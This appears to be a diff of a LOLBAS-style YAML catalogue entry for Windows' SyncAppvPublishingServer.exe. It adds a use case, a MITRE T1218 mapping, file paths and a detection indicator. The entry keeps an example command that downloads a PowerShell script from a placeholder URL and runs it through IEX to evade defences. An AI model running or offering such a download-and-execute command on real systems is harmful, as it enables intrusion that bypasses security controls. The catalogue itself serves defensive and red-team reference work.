@@ -1,16 +1,27 @@
 ---
 Name: SyncAppvPublishingServer.exe
-Description: Execute
-Author: ''
+Description: Used by App-v to get App-v server lists
+Author: 'Oddvar Moe'
 Created: '2018-05-25'
-Categories: []
 Commands:
   - Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
     Description: Example command on how inject Powershell code into the process
+    Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full Path:
-  - C:\Windows\System32\SyncAppvPublishingServer.exe
-Code Sample: []
-Detection: []
+  - Path: C:\Windows\System32\SyncAppvPublishingServer.exe
+  - Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe
+Code Sample: 
+- Code:
+Detection:
+ - IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
 Resources:
-  - https://twitter.com/monoxgas/status/895045566090010624
-Notes: Thanks to Nick Landers - @monoxgas
+  - Link: https://twitter.com/monoxgas/status/895045566090010624
+Acknowledgement:
+  - Person: Nick Landers
+    Handle: '@monoxgas'
+---
